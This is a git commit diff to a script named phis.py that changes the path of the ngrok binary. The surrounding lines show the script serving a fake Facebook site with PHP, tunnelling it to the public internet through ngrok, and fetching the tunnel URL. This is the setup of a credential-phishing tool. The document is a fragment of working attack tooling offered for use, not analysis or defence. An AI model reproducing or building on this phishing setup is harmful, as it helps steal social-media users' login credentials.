29ef08e13275c0c4d45b972b3fdfc800330c1f0e
ABIRHOSSAIN10 <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2021-08-21 19:24:45 +0600

    Update phis.py

--- phis.py
+++ phis.py
@@ -6,7 +6,7 @@ os.system("killall ngrok> /dev/null 2>&1 || killall /ngrok> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
 #os.system("chmod +x./ngrok")
 #os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
-os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
+os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
     datajson = json.load(data_file)
